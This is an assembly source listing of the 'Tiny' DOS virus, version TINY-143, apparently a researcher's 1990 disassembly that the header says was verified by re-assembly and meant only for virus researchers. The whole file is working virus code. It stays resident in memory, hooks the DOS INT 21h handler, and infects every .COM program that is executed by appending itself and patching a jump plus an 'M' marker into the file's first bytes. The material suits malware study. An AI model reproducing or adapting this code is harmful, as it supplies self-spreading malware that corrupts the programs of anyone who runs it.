	page	,132
	name	TINY143
	title	The 'Tiny' virus, version TINY-143
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ
; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     บ
; บ									     บ
; บ			 The 'Tiny' Virus, version TINY-143                  บ
; บ		   Disassembled by Vesselin Bontchev, August 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code, ds:code

	org	100

seg_60	equ	600
v_len	equ	v_end-first4

start:
	jmp	v_entry 	; Jump to virus code
	db	'M'             ; Virus signature
	mov	ax,4C00 	; Program terminate
	int	21

; The original first 4 bytes of the infected file:

first4	db	0EBh, 2, 90, 90

v_entry:
	mov	si,0FF		; Initialize some registers
	mov	di,offset start ; Put the addres of program start in DI
	mov	bx,int_21-first4+seg_60 ; Point BX at new INT 13h handler

; The virus will be installed in memory at
; address 0050:0100h (i.e., at segment 60h):

	mov	cx,50

	add	si,[si+2]	; Determine the start addres of the virus body

	push	di		; Now a Near RET instruction will run the prg.

	movsw			; Restore the original first 4 bytes
	movsw

	mov	es,cx		; Point ES:DI at 0050:0100h
	cmpsb			; Check if the virus is present in memory
	jz	run		; Just run the program if so

; Virus not in memory. Install it there:

	dec	si		; Correct SI & DI to point at the start of
	dec	di		;  virus code and to destination address
	rep	movsw		; Move the virus there

	mov	es,cx		; ES := 0

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler.
; By the way, now DI == 1A4h (i.e., 69h*4):

	xchg	ax,bx		; Thransfer INT 21h vector to INT 69h,
	xchg	ax,cx		;  preserving AX
lp:
	xchg	ax,cx		; Get a word
	xchg	ax,es:[di-(69-21)*4]	; Swap the two words
	stosw			; Save the word
	jcxz	lp		; Loop until done (two times)

	xchg	ax,bx		; Restore AX (to keep progs as DISKCOPY happy)

run:
	push	ds		; Restore ES
	pop	es
	ret			; And exit (go to CS:100h)

int_21: 			; New INT 21h handler
	cmp	ax,4B00 	; EXEC function call?
	jne	end_21		; Exit if not

	push	ax		; Save registers used
	push	bx
	push	dx
	push	ds
	push	es

	mov	ax,3D02 	; Open the file for both reading and writting
	int	69
	jc	end_exec	; Exit on error
	xchg	ax,bx		; Save the file handle in BX

	call	lseek1		; Lseek to file beginning (and set CL to 4)

	mov	al,seg_60 shr 4 ; Read the first 4 bytes of the file
	mov	ds,ax		; Set buffer offset to 0060:0000h
	mov	es,ax		; Point ES there too
	mov	ah,3F
	int	69		; Do read

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

	xor	di,di
	mov	al,'M'          ; Look for `M'
	repne	scasb
	jz	close		; Exit if file not suitable for infection

	mov	al,2		; Seek to the end of file (and put 4 in CL)
	call	lseek

	push	ax		; Save file length

	mov	cl,v_len	; Length of virus body
	mov	ah,40		; Append the virus to the file
	int	69		; Do it

	call	lseek1		; Seek to the file beginning

	xchg	ax,di		; Point DX at first4
	mov	al,0E9		; Near JMP opcode
	stosb			; Form the first instruction of the file
	pop	ax		; Restore file length in AX
	inc	ax
	stosw			; Form the JMP's opperand
	mov	al,'M'          ; Add a `M' character to mark the file
	stosb			;  as infected

	mov	ah,40		; Overwrite the first 4 bytes of the file
	int	69		; Do it

close:
	mov	ah,3E		; Close the file
	int	69

end_exec:
	pop	es		; Restore used registers
	pop	ds
	pop	dx
	pop	bx
	pop	ax

; Exit through the original INT 21h handler:

end_21:
	jmp	dword ptr cs:[69*4]

lseek1:
	mov	al,0		; Lseek to the file beginning

lseek:
	mov	ah,42		; Lseek either to file beginning or to file end
	xor	cx,cx
	xor	dx,dx
	int	69		; Do it

	mov	cl,4		; Put 4 in CL
	ret			; Done

v_end	equ	$		; End of virus body

code	ends
	end	start
